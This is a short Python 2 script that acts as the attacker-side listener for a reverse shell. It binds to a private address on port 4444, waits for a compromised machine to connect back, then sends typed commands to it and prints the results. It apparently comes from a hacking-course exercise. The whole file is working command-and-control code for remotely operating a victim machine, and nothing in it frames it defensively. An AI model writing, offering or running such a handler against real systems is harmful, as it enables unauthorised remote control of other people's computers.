#!/usr/bin/env python
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections!")
        self.conn, addr = listener.accept()
        print("[+] Got a new connection from " + str(addr))

    def execute_remotely(self, command):
        self.conn.send(command)
        return self.conn.recv(1024)

    def run(self):
        while True:
            command = raw_input(">> ")
            command_result = self.execute_remotely(command)
            print(command_result)


my_listener = Listener("192.168.65.128", 4444)
my_listener.run()